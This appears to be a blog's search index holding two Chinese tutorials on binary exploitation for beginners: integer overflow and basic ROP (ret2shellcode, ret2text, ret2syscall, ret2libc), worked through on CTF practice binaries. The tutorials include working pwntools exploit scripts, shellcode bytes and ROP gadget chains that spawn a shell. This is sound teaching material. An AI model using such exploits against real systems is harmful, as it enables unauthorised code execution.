<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[不一样的整数溢出]]></title>
    <url>%2F2020%2F03%2F25%2F1%2F</url>
    <content type="text"><![CDATA[一个经常被忽视的溢出 0x01为什么会存在整数溢出 回答这个问题前，我们需要了解下整数在计算机的存储方式。在计算机中，因为二值逻辑，只有开和关（通电、断电）来表示两种状态，这刚好与”0”、”1”相对应，因此在存储单元都是以0和1来呈现，那么对于有符号数与无符号数的区别就是：以所能表示的长度的空间，它的最高位所代表的性质不同，如下如所示： 这是一个存放8个1的8bit长度的存储单元，其最高位的不同(符号位和数值位)决定了它的绝对值的不同，当然决定了其取值范围的不同。把握其中的三个关键点：一、固定长度的空间(存储单元)二、符号位和数值位三、如果运算后发生进位溢出，绿色区域的空间依旧可以用其实这样梳理以后，整数溢出的原理就随之对应而来了。 0x02 整数溢出原理 先来看一下整数溢出的危害如果我们用某个整数来表示空间的大小或者说索引，那么整数溢出可以导致堆溢出或者栈溢出，间接导致任意代码执行。可以发现，整数溢出，实际上就是程序没有按照我们正常逻辑去进行(出乎意料)，被恶意利用后就会产生危害。可以对应上述(关键点)三种情况：一、两个不同长度的储存空间进行赋值。将一个长度较长的数赋值给长度较短的空间，高位会被截断。二、有符号数与无符号数之间的转换。由于最高位的性质不同，导致各种出乎意料的状况发生。三、有(无)符号数的四则运算。比如符号相同的数就行相加，只有数值最高位或者符号位进位时，就会发生溢出；较大的无符号数的相加也会导致溢出。具体的一些细节可以参考《计算机组成原理》的计算机的运算方法。 0x03 整数溢出例子分解 知道了原理，也清楚了类型，这里就一个一个分解，个人感觉论溢出的时候，从二进制出发考虑数据类型的取值范围和溢出临界点会更容易理解。 一、截断12345678910#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[]) &#123; int a = 65536; // 0x10000 -&gt; 1 0000 0000 0000 0000 short b; b = a; printf(&quot;%d\n&quot;, b); return 0;&#125; short 为16bit（其中1位符号位），int为32bit（其中1位符号位）当把a（17bit）赋值给b时，会发生高位截断，从而b为 0000 0000 0000 0000，也就是0。再来详细看一下具体执行过程。 1234567890040152E C74424 1C 00000&gt;mov dword ptr ss:[esp+0x1C],0x10000// Stack ss:[0061FE9C]=0001000000401536 8B4424 1C mov eax,dword ptr ss:[esp+0x1C]// eax=000100000040153A 66:894424 1A mov word ptr ss:[esp+0x1A],ax// 重点来了，取eax的低16位的值放到ss:[0061FE9A]中，也就是00000040153F 0FBF4424 1A movsx eax,word ptr ss:[esp+0x1A]// eax=0000000000401544 894424 04 mov dword ptr ss:[esp+0x4],eax 可以发现，在执行的时候eax的高位被截断了，只有操作了低16位的存储的数值。 二、有(无)符号数之间的转换12345678910#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[]) &#123; unsigned short a = 32768; // 0x8000 -&gt; 1000 0000 0000 0000 short int b; b = a; printf(&quot;%d\n&quot;, b); return 0;&#125; 此时b又是多少呢？按照刚才的方法，从二进制的数入手，显然b为：1000 0000 0000 0000，虽然每一位的数没有变，但是最高位的性质变了，现在为符号位，也就是表示负数，后面15位为数值。那么此时的值是多少呢？计算机对负数是以补码的形式进行保存的，因此值为-2的15次方*1，也就是-32768。再来详细看一下具体执行过程。 1234567890040152E 66:C74424 1E 00&gt;mov word ptr ss:[esp+0x1E],0x8000// Stack ss:[0061FE9E]=800000401535 0FB74424 1E movzx eax,word ptr ss:[esp+0x1E]// eax=00080000040153A 66:894424 1C mov word ptr ss:[esp+0x1C],ax// Stack ss:[0061FE9C]=80000040153F 0FBF4424 1C movsx eax,word ptr ss:[esp+0x1C]// 可以发现两次用到了不同的指令movzx和movsx，第一个是无符号扩展，并传送，第二个带符号扩展，并传送，所以此处的eax=FFF800000401544 894424 04 mov dword ptr ss:[esp+0x4],eax 三、有(无)符号的四则运算 先来看有符号的加法 123456789#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[]) &#123; short a = 32767; // 0x7fff -&gt; 0111 1111 1111 1111 a++; printf(&quot;%d\n&quot;, a); return 0;&#125; short最大数加一后，就会变成最小数。 再来详细看一下具体执行过程。 12345678910110040152E 66:C74424 1E FF&gt;mov word ptr ss:[esp+0x1E],0x7FFF// Stack ss:[0061FE9E]=7FFF00401535 0FB74424 1E movzx eax,word ptr ss:[esp+0x1E]// eax=0007FFF0040153A 83C0 01 add eax,0x1// 执行自加，eax=0080000040153D 66:894424 1E mov word ptr ss:[esp+0x1E],ax// Stack ss:[0061FE9E]=800000401542 0FBF4424 1E movsx eax,word ptr ss:[esp+0x1E]// 使用movsx把0x8000再次放进eax中，eax=FFF800000401547 894424 04 mov dword ptr ss:[esp+0x4],eax 分析完这几个类型后，疑惑就来了，说了这么多怎么利用呢？ 0x03 实战 这里选用攻防世界的int_overflow为例进行分析拖到IDA中查看伪代码 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp+Ch] [ebp-Ch] setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); puts(&quot;---------------------&quot;); puts(&quot;~~ Welcome to CTF! ~~&quot;); puts(&quot; 1.Login &quot;); puts(&quot; 2.Exit &quot;); puts(&quot;---------------------&quot;); printf(&quot;Your choice:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v4); if ( v4 == 1 )&#123; login(); &#125; else&#123; if ( v4 == 2 )&#123; puts(&quot;Bye~&quot;); exit(0); &#125; puts(&quot;Invalid Choice!&quot;); &#125; return 0;&#125; 没有发现可疑问题，查看login()函数 123456789101112int login()&#123; char buf; // [esp+0h] [ebp-228h] char s; // [esp+200h] [ebp-28h] memset(&amp;s, 0, 0x20u); memset(&amp;buf, 0, 0x200u); puts(&quot;Please input your username:&quot;); read(0, &amp;s, 0x19u); printf(&quot;Hello %s\n&quot;, &amp;s); puts(&quot;Please input your passwd:&quot;); read(0, &amp;buf, 0x199u); return check_passwd(&amp;buf);&#125; 似乎也没什么可疑的地方，继续查看check_passwd(&amp;buf)，可以先注意下变量buf，因为他是可控的，长度为0x199 12345678910111213141516char *__cdecl check_passwd(char *s)&#123; char *result; // eax char dest; // [esp+4h] [ebp-14h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if ( v3 &lt;= 3u || v3 &gt; 8u ) &#123; puts(&quot;Invalid Password&quot;); result = (char *)fflush(stdout); &#125; else&#123; puts(&quot;Success&quot;); fflush(stdout); result = strcpy(&amp;dest, s); &#125; return result;&#125; 查看到这里，我们首先发现就是strcpy函数导致的栈溢出，为什么这么说呢？变量buf的长度0x199，又可以发现变量dest的位置是ebp-14h，也就是我们可以控制变量s来控制函数的返回值，进而控制EIP的值，详细的原理和方法，可以参看走进栈溢出和初探ROP。但是问题又来了，程序用了一个if语句限制了变量buf的长度，使得我们无法达到所想的栈溢出效果，是不是就无法攻击了？回到这一篇文章的核心思想，就知道我们需要寻找整数的溢出的地方。 123unsigned __int8 v3; // [esp+Fh] [ebp-9h]v3 = strlen(s);if ( v3 &lt;= 3u || v3 &gt; 8u ) &#123; 可以发现v3是一个8bit的无符号的变量，但是我们的变量buf(后面表示为s)的长度却可以达到0x199，也就是409bit的长度，这里就是我们在文章开头提到的第一种情况：将一个长度较长的数赋值给长度较短的空间，高位会被截断。如下图所示： v3的数值就是s的长度的低8位的数值，所以我们只要控制低8位的值就可以绕过if，完成后面的栈溢出攻击。继续分析，v3∈(3, 8]，化为二进制(0000 0011, 0000 1000]，那么s的长度(设为L)的后八位应该为(0000 0011, 0000 1000]，要想达到整数溢出，L的第九位数值必须为1，即L(低九位)∈(10000 0011, 10000 1000]，也就是(259, 264],这也是整个L的长度。构造payload来获取flag，在IDA中可以找到 12345678910111213141516171819int what_is_this()&#123; return system(&quot;cat flag&quot;);&#125;对应.text:0804868B what_is_this proc near.text:0804868B ; __unwind &#123;.text:0804868B push ebp.text:0804868C mov ebp, esp.text:0804868E sub esp, 8.text:08048691 sub esp, 0Ch.text:08048694 push offset command ; &quot;cat flag&quot;.text:08048699 call _system.text:0804869E add esp, 10h.text:080486A1 nop.text:080486A2 leave.text:080486A3 retn.text:080486A3 ; &#125; // starts at 804868B.text:080486A3 what_is_this endp 把返回地址覆盖为0x804868B即可获取flag，构造payload 12payload = flat([&apos;a&apos; * 0x18, 0x804868B, &apos;a&apos; * 232])//像这种凑长度了使用payload = flat([&apos;a&apos; * 0x18, 0x804868B]).ljust(260,&quot;a&quot;) 可以再用gdb确认一下溢出临界，在strcpy处下断点，如下图所示，这里可以详细推敲一下(虽然意义不大，但是挺好玩的)，esp中存的是s的开始位置0xfffbbf4，ebp为0xfffbc08，可以发现是相差0x14。 其实这个elf文件的溢出临界也可以在汇编代码中找，如下图所示，有些文件会以esp+0xN来显示，因此可以用上面设置断点的方法找。 分析到这，此题也算是做完了，编写exp拿到flag即可，而且此题对整数溢出的应用更加深了。 123456789from pwn import * io = remote(&quot;111.198.29.45&quot;, 35521) cat_flag_addr = 0x0804868B io.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;) io.sendlineafter(&quot;your username:&quot;, &quot;threepwn&quot;) payload = flat([&apos;a&apos; * 0x18, cat_flag_addr, &apos;a&apos; * 232])io.sendlineafter(&quot;your passwd:&quot;, payload) io.recv() io.interactive() 0x04 附录 借用ctfwiki的一幅图（个人感觉从二进制入手会更容易理解整数溢出） 0x05 尾记 还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。参考：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/integeroverflow/intof-zh/]]></content>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
        <tag>整数溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初探ROP]]></title>
    <url>%2F2020%2F03%2F15%2F1%2F</url>
    <content type="text"><![CDATA[一步一步走，一点一点来，究其原因：我太菜了 0x01 前言 在了解栈溢出后，我们再从原理和方法两方面深入理解基本ROP。 0x02 什么是ROP ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过上一篇文章走进栈溢出，我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。 0x03 为什么要ROP 探究原因之前，我们先看一下什么是NX(DEP)NX即No-execute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就有了各种绕过办法，rop就是一种 0x04 基本ROPret2shellcode含义 我们先看这个，顾名思义，ret to shellcode，就是将返地址覆盖到我们插入shellcode的首地址。 从原理中解析ret2shellcode 先通过一个小程序回顾一下栈溢出利用过程： 12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;char buf[10];int main(int arg, char **args)&#123; char s[10]; puts(&quot;start !!!&quot;); gets(s); strncpy(buf, s, 10); printf(buf); printf(&quot;\nend !!!&quot;); return 0;&#125; 可以知道s所在位置为esp+0x16，esp=0x0061FE80，那么s所在位置为61FF96，也就是ebp-0x12，因此填充18个字符即可满足溢出的临界条件 利用IDA找到buf的地址0x004053E0，在BSS段。这里普及一下是BSS段：BSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。既然可读写那么只要能够在栈内写入的payload，然后再转移到此处，并且执行权限就可以控制。通过strncpy函数达到这一目的 从例子中解析ret2shellcode 来看一个例子：ret2shellcode 发现利用点1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No system for you this time !!!&quot;); gets(&amp;s); strncpy(buf2, &amp;s, 0x64u); printf(&quot;bye bye ~&quot;); return 0;&#125; 在IDA中能够发现两点：一、存在栈溢出二、能利用写入/bin/sh进行getshell 确定利用前提 此时只需要确定是否开启NX和bss段是否可以执行首先检查保护机制 然后在IDA中确定buf2的BSS段位置 12.bss:0804A080 public buf2.bss:0804A080 ; char buf2[100] 查看该BSS段是否具有执行权限 一切完成后，可以发现这个文件可以进行ret2shellcode 调试 在get处设置断点，来确定s变量与ebp的距离，可以看到 s 的地址为 0xffffbe3c，计算一下得出 s 相对于 ebp 的偏移为 0x6c。 12345这里为什么要在get处设置断点？因为知道s的地址才能计算出相对于ebp的偏移，此处esp刚好存储s的的地址0x804858c &lt;main+95&gt;: lea eax,[esp+0x1c]0x8048590 &lt;main+99&gt;: mov DWORD PTR [esp],eax当然您可以选择其它位置，只不过这里更便捷。 可以知道溢出的临界点与触发地址还有一个4个字节的间隔所以payload的结构是含有shellcode的6c个字节+4个字节+buf2地址 123456from pwn import *sh = process(&apos;./ret2shellcode&apos;)shellcode = asm(shellcraft.sh())buf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, &apos;A&apos;) + p32(buf2_addr)) //含有shellcode的6c个字节+4个字节+buf2地址sh.interactive() 扩展点123456789&gt;&gt;&gt; asm(shellcraft.sh())&apos;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&apos;&gt;&gt;&gt; asm(shellcraft.sh()).ljust(112, &apos;A&apos;)&apos;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&apos;所以我们也可以直接构造，pwntools提供了shellcraft模块更方便。shellcraft模块是shellcode的模块，包含一些生成shellcode的函数。这里的shellcraft.sh()则是执行/bin/sh的shellcodeshellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;shellcode.ljust(112, &apos;A&apos;) + p32(buf2_addr) ret2text含义 顾名思义，ret to text，也就是说我们的利用点在原文件中寻找即可，控制程序执行程序本身已有的的代码 (.text)。 从例子中解析ret2text 来看一个例子：ret2text 发现利用点 IDA查看找到构成栈溢出漏洞的条件 确定利用前提 开启了NX，栈上无法写入shellcode 那么我们寻找程序中是否存在/bin/sh或者systerm()等在IDA的Strings窗口找到/bin/sh 123456789101112131415161718192021LOAD:08048154 00000013 C /lib/ld-linux.so.2LOAD:080482C9 0000000A C libc.so.6LOAD:080482D3 0000000F C _IO_stdin_usedLOAD:080482E2 00000005 C getsLOAD:080482E7 00000006 C srandLOAD:080482ED 0000000F C __isoc99_scanfLOAD:080482FC 00000005 C putsLOAD:08048301 00000005 C timeLOAD:08048306 00000006 C stdinLOAD:0804830C 00000007 C printfLOAD:08048313 00000007 C stdoutLOAD:0804831A 00000007 C systemLOAD:08048321 00000008 C setvbufLOAD:08048329 00000012 C __libc_start_mainLOAD:0804833B 0000000F C __gmon_start__LOAD:0804834A 0000000A C GLIBC_2.7LOAD:08048354 0000000A C GLIBC_2.0.rodata:08048763 00000008 C /bin/sh.rodata:0804876C 00000037 C There is something amazing here, do you know anything?.rodata:080487A4 00000022 C Maybe I will tell you next time !.eh_frame:08048833 00000005 C ;*2$\&quot; 双击找到地址，那就是我们溢出到EIP的地址 调试 因为原理相似，不再赘述，详细见ret2shellcode ret2syscall含义 顾名思义，ret to syscall，就是调用系统函数达到目的 从例子中解析ret2syscall的方法 那么这里我们来深入了解一下什么是ret2syscall？为什么可以ret2syscall？在深入了解之前，先从一个例子rop中快速过一下方法IDA中查看伪代码 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;); puts(&quot;What do you plan to do?&quot;); gets(&amp;v4); return 0;&#125; 与上面两个例子相似，原理详细见ret2shellcode，但是获取/bin/sh则需要使用系统调用来获取，也就是ret2syscall专属方法，下面我们就说一下这个专属方法。首先什么是系统调用？ 1在计算中，系统调用是一种编程方式，计算机程序从该程序中向执行其的操作系统内核请求服务。这可能包括与硬件相关的服务（例如，访问硬盘驱动器），创建和执行新进程以及与诸如进程调度之类的集成内核服务进行通信。系统调用提供了进程与操作系统之间的基本接口。 至于系统调用在其中充当什么角色，稍后再看现在我们要做的是：让程序调用execve(“/bin/sh”,NULL,NULL)函数即可拿到shell调用此函数的具体的步骤是这样的：因为该程序是 32 位，所以我们需要使得系统调用号，即 eax 应该为 0xb第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。第二个参数，即 ecx 应该为 0第三个参数，即 edx 应该为 0最后再执行int 0x80触发中断即可执行execve()获取shell 我们来看这一套流程：1、存在栈溢出2、使用ret2syscall手法进行操作第一步与前两个方法一样，怎么样去偏移怎么去覆盖不再赘述，详见ret2shellcode，第二步ret2syscall手法也是中规中矩，照猫画虎即可。 细说系统调用在ret2syscall的作用 我们这里要说一说系统调用在其中充当了什么角色，这样才能更好地理解为什么要ret2syscall。 一探系统调用从用户态到内核态 先对这三个词的概念进行了解一下 1234用户态：user_space（或用户空间）是指在操作系统内核之外运行的所有代码。user_space通常是指操作系统用于与内核交互的各种程序和库：执行输入/输出，操纵文件系统对象的软件，应用程序软件等。也就是上层应用程序的活动空间，应用程序的执行必须依托于内核提供的资源内核态：控制计算机的硬件资源，并提供上层应用程序运行的环境，cpu可以访问内存的所有数据，包括外围设备，例如硬盘，网卡，cpu也可以将自己从一个程序切换到另一个程序。两中空间的分离可提供内存保护和硬件保护，以防止恶意或错误的软件行为。系统调用：为了使上层应用能够访问到这些资源，内核为上层应用提供访问的接口。 大致的关系如下： 再看一下系统调用的基本过程：开始时应用程序准备参数，发出调用请求，然后glibc中也就是c标准库封装函数引导，执行系统调用，这里我们只探讨到这两个过程。可以发现上述两个过程从用户态（第一步）过渡到内核态（第二步），系统调用就是中间的过渡件，我们能控制的地方就是用户态，然后通过系统调用控制到内核态。先看一个程序 1234567891011121314section .text global _start _start: mov edx, len ;message length mov ecx, msg ;message to write mov ebx, 1 ;file descriptor (stdout) mov eax, 4 ;system call number (sys_write) int 0x80 ;call kernel mov eax, 1 ;system call number (sys_exit) int 0x80 ;call kernelsection .datamsg db &apos;Hello World&apos;,0xalen equ $ - msg 可以发现该程序通过调用sys_write函数进行输出Hello World，那么sys_write()是什么？ 1sys_write(unsigned int fd, const char __user *buf, size_t count); 可以发现前三个mov指令是把该函数需要的参数放进相应寄存器中，然后把sys_write的系统调用号放在EAX寄存器中，然后执行int 0x80触发中断即可执行sys_call()，那么问题就来了：这几个寄存器有什么作用？为什么int 0x80？int 0x80后发生了什么？带着问题我们继续往下看 二探系统调用set_system_gate 为何int 0x80？在系统文件中有这么一行代码 1set_system_gate(0x80,&amp;system_call); 在系统启动的时候，系统会在sched_init(void)函数中调用set_system_gate(0x80,&amp;system_call)，设置中断向量号0x80的中断描述符，也就是说实现了系统调用 (处理过程system_call)和 int 0x80中断的对应，进而通过此中断号用EAX实现不同子系统的调用。详细了解，参见《linux 0.12》int 0x80后发生了什么？经过初始化以后，每当执行 int 0x80 指令时，产生一个异常使系统陷入内核空间并执行128号异常处理程序，也就是绑定后的函数，即系统调用处理程序 system_call()，此时CPU完成从用户态到内核态切换，开始执行system_call()。 system_call() 当进入system_call()后，主要做了两件事(我们关心的事情，其它的事情忽略，有兴趣可以去了解)首先处理中断前设置环境的过程然后找到实际处理在入口规定：数值会放在eax,ebx,ecx,edx，参数一般为4个所以ebx,ecx,edx会被压入栈中设置环境(也就是函数所需要的参数)，当然ds、es等也要压入，这里不是我们考虑的范围内，有兴趣可以去了解。然后就会调用call_sys_call_table(,%eax,4)来实现相应系统函数的调用。那么从大门进入后怎么知道进那个小门(系统函数)呢？存在这么一个数组——sys_call_table(对应的处理函数少部分在这里面进行处理)，处理函数功能号对应sys_call_table[]的下标，sys_execve()函数的下标就是11，也就是0xb。此刻应该会明朗了，那么我们言归正传，回到ret2syscall来。 从例子中再次解析ret2syscall创造条件 通过以上的了解，我们知道如果要执行execve(“/bin/sh”,NULL,NULL)函数我们需要这样做： 1234567; NASMint execve(const char *filename, char *const argv[], char *const envp[]); mov eax, 0xb ; execve系统调用号为11mov ebx, filename mov ecx, argvmov edx, envpint 0x80 ; 触发系统调用 其中，execve()执行程序由 filename决定。filename必须是一个二进制的可执行文件，或者是一个脚本以#！格式开头的解释器参数参数。记得当时考(ku)研(bi)观看张宇老师视频时的一句话：大手一挥，毛主席说,没有条件要创造条件。那么我们也要小手一挥，没有条件创造条件。上面也提到了，我们只能控制用户态的操作，也就是上面程序类似mov指令的操作。那么怎么做呢？这里需要ret2syscall的特有操作之前已经知道各个寄存器的需要的内容了，此时就要想办法把这些值存储进对应的寄存器中回归词意，ret to syscall，也就是找ret结尾的片段，比如把EAX置为0xb，执行以下程序即可完成。 12pop eaxret 当然父程序通过栈溢出，执行ret后栈顶值为0xb，这样再调用此片段(父程序的ret addr为此片段的首地址)，EAX寄存器就会置为0xb，后面详细解读过程。如果有多个片段连接起来不就可以把四个寄存器置为相应的值了吗 只要用户态栈空间能够控制成这样(只是举例其中的一种排列方式)就可以达到ret2syscall的目的简单分析一下流程：1、成功溢出2、通过ret指令使得EIP指向pop eax;的地址3、执行pop eax;栈顶值0xb成功出栈，栈顶指针下移4、通过ret指令使得EIP指向pop ebx;的地址…..一切都清楚后，下面就开始进行创造条件 123456pwn@pwn-PC:~/Desktop$ ROPgadget --binary rop --only &apos;pop|ret&apos; | grep &apos;eax&apos;0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x080bb196 : pop eax ; ret0x0807217a : pop eax ; ret 0x80e0x0804f704 : pop eax ; ret 30x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 选取其中一个就可以，比如可以选择第一行，那么你的用户态栈内容按照第一个的指令进行变化，出栈四次，然后才可以将ESP值置为下一个条件(pop ebx;)的地址，也就是说0xb+‘AAAA’+’AAAA’+’AAAA’+addr(pop ebx;)，因此我们不如选择第二行。 12345678pwn@pwn-PC:~/Desktop$ ROPgadget --binary rop --only &apos;pop|ret&apos; | grep &apos;ebx&apos;0x08049a94 : pop ebx ; pop esi ; ret0x080481c9 : pop ebx ; ret0x080d7d3c : pop ebx ; ret 0x6f90x08099c87 : pop ebx ; ret 80x0806eb91 : pop ecx ; pop ebx ; ret0x0806336b : pop edi ; pop esi ; pop ebx ; ret0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 简单展示部分内容，与上一个选取原理是一样的，为了方便，我们选择最后一行。 12345678910pwn@pwn-PC:~/Desktop$ ROPgadget --binary rop --string &apos;/bin/sh&apos;Strings information============================================================0x080be408 : /bin/shpwn@pwn-PC:~/Desktop$ ROPgadget --binary rop --only &apos;int&apos;Gadgets information============================================================0x08049421 : int 0x80Unique gadgets found: 1 条件已经创造完了，万事俱备，只欠东风，现在只需要把这些条件串联起来就可以实现ret2syscall，我们从下图来能够看到，ESP指针依次下移，直到指向int 0x80触发中断。 payload123456789from pwn import *sh = process(&apos;./rop&apos;)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = flat([&apos;A&apos; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() ret2libc 对于ret2libc，借用ctfwiki的三个例子详细解读其中的原理和利用过程。 含义 我们知道，操作系统通常使用动态链接的方法来提高程序运行的效率。那么在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载。也就是控制执行 libc（对应版本） 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)（或者execve(“/bin/sh”,NULL,NULL)），故而此时我们需要知道 system 函数的地址，具体可以移步深入理解GOT表和PLT表。 初探ret2libc 上面已经提到了，我们只要可以执行类似system(“/bin/sh”)的函数即可获取shell，在存在溢出的程序中我们在一般怎么去执行此函数呢？大致可以分为三类：一、”/bin/sh”字符串和system函数都可以在程序找到二、二者其一找不到（一般为”/bin/sh”字符串找不到）三、二者都没有无论是哪一种情况，我们需要找到”/bin/sh”字符串和system()函数，并且堆栈位置如下： 当然还需了解一下x86对于形参的处理，就可以知道上图的“任意四字符”处为返回地址，因为我们不用考虑程序后续怎去正常运行，达到getshell的目的即可，程序的具体执行过程可以参照走进栈溢出。 那么我们分开说一下怎去利用。 再探ret2libc 先看一个简单的例子， 也就是我们说的第一种情况。检查保护机制，程序为32位并且开了NX保护，继续反编译从伪代码可以发现gets()处导致栈溢出，对于以上步骤，本文已经详细讲述过，不再赘述，以下两种情况的分析也直接省去该过程。按照上述的理论，我们在IDA的Stings中可以找到”/bin/sh”，在Functions中可以找到system()函数 123456.rodata:08048720 aBinSh db &apos;/bin/sh&apos;,0 ; DATA XREF: .data:shell↓o.plt:08048460 ; int system(const char *command).plt:08048460 _system proc near ; CODE XREF: secure+44↓p.plt:08048460 command = dword ptr 4.plt:08048460 jmp ds:off_804A018.plt:08048460 _system endp 找到0x08048720和0x08048460后，按照上图所示的堆栈位置构造payload： 123binsh_addr = 0x8048720system_plt = 0x8048460payload = flat([&apos;a&apos; * 112, system_plt, &apos;b&apos; * 4, binsh_addr]) 三探ret2libc 在这一节，首先说一下第二种情况的例子。可以发现在IDA中只能找到system()函数的plt地址，却没有看到”/bin/sh”字符串的踪影 12345.plt:08048490 ; int system(const char *command).plt:08048490 _system proc near ; CODE XREF: secure+44↓p.plt:08048490 command = dword ptr 4.plt:08048490 jmp ds:off_804A01C.plt:08048490 _system endp 没有了”/bin/sh”字符串，就没办法获取shell，那么我们就得创造条件。除了现成的内容，我们也可以人工输入，那么就需要gets()函数来实现这一目的，因此目前的结构应该如下图所示。 当然也可以进行堆栈平衡，在执行完gets()函数后提升堆栈(add esp, 4)，堆栈位置如下： 1程序在读写数据的时候是通过地址查找的,如果函数调用之前的堆栈与函数调用之后的堆栈不一致,就可能导致找不到数据或找到的数据错误,那么久有可能导致程序崩溃。 这样构造使得我们的堆栈逻辑更好看，一个函数一个函数的顺序执行，从压入形参到结束，显得有条理，但是只要达到目的即可，第一种或许更方便一些。那么采取第一种做法，找到相应的地址 1234.plt:08048460 _gets proc near ; CODE XREF: main+72↓p.plt:08048460 s = dword ptr 4.plt:08048460 jmp ds:off_804A010.plt:08048460 _gets endp 如同ret2shellcode一节中做法一样，在bss段找到一个数组，确保其有执行权限 1.bss:0804A080 ; char buf2[100] 完成这些步骤后，就可以构造payload了 123456gets_plt = 0x08048460system_plt = 0x08048490buf2 = 0x804a080payload = flat([&apos;a&apos; * 112, gets_plt, system_plt, buf2, buf2])sh.sendline(payload)sh.sendline(&apos;/bin/sh&apos;) 继续来看第三种情况，如果什么都没有，我们怎么去一个一个去创造条件？对于’/bin/sh’字符串的构造已经知道了，剩下的就是怎么找到system函数这里需要事先了解下动态链接时GOT表和PLT表的作用，可以参考深入理解GOT表和PLT表 此文。可以发现，GOT表的第三项调用_dl_runtimw_resolve将真正的函数地址，也就是glibc运行库中的函数的地址，回写到代码段，就是got[n]（n&gt;=3）中。也就是说在函数第一次调用的时，才通过连接器动态解析并加载到.got.plt中，而这个过程称之为延时加载或者惰性加载。目前的思路就是，通过栈溢出泄露某函数(一般为泄露 __libc_start_main 地址，这里选择泄露put函数)的GOT表地址，然后根据偏移量（libc中函数与函数之间的距离时固定的）来计算出system()的地址，有了’/bin/sh’也有了system，shell自然就有了，如下图所示。 使用pwntools编写 1234567891011from pwn import *sh = process(&apos;./ret2libc3&apos;)elf = ELF(&apos;./ret2libc3&apos;)puts_plt = elf.plt[&apos;puts&apos;]puts_got = elf.got[&apos;puts&apos;]payload = flat([&quot;A&quot; * 112, puts_plt, &quot;A&quot; * 4, puts_got])sh.sendlineafter(&quot;Can you find it !?&quot;, payload)puts_addr = u32(sh.recv(4))print &quot;[*]puts addr: &quot; + hex(puts_addr) 可以发现通过相应的模块可以顺利获取puts函数的真实地址（也就是GOT表中存储的地址） 12345678910111213141516pwn@pwn-PC:~/Desktop$ python ret2libc.py [+] Starting local process &apos;./ret2libc3&apos;: pid 45169[*] &apos;/home/pwn/Desktop/ret2libc3&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] u&apos;/usr/lib/i386-linux-gnu/libc-2.24.so&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[*]puts addr: 0xf7d6f880[*] Stopped process &apos;./ret2libc3&apos; (pid 45169) 那么问题来了？此处的溢出用来获取put函数的真实地址，怎么再去进行执行system(‘bin/sh’)呢？如果存在两个溢出点就完美了，可惜只有一个。不过刚才提到的返回地址，在这里就有了用武之地了，它可以让我们有“两个”溢出点。如果put函数的返回地址可以回到函数的入口，不就可以再执行一遍gets(溢出点)了吗？怎么构造之前简单了解用户代码的入口和系统代码的入口，在一个程序运行中有两个入口，一个是main()，另一个是_start()，简单来说，main()函数是用户代码的入口，是对用户而言的；而_start()函数是系统代码的入口，是程序真正的入口。这里以main()函数作为入口为例，如下图所示： 